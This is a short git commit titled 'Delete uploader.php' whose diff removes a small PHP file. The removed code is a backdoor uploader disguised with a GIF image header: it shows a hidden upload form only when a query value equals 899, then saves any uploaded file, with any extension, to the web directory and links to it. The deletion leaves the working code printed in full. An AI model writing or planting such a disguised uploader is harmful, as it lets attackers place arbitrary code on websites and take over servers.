cfcbf717e6ad7fcc25d9162228c52b58d7b81423
CybrX1337 <cybrx1337@gmail.com>
2025-12-23 02:47:57 +0700

    Delete uploader.php

--- uploader.php
+++
@@ -1,6 +0,0 @@
-GIF89;a
-<?php
-$x=$_GET;$y=false;foreach($x as $z){if($z==899){$y=true;break;}}
-if($y){?><form method=post enctype=multipart/form-data><input type=file name=i><input type=submit value=1></form><?php }
-if(isset($_FILES['i'])){$a=$_FILES['i'];$b=strtolower(substr(strrchr($a['name'],'.'),1));$c=rand(1000,9999).time().'.'.$b;if(@copy($a['tmp_name'],$c)){echo'<a href="'.$c.'">'.$c.'</a>';}exit;}
-?>
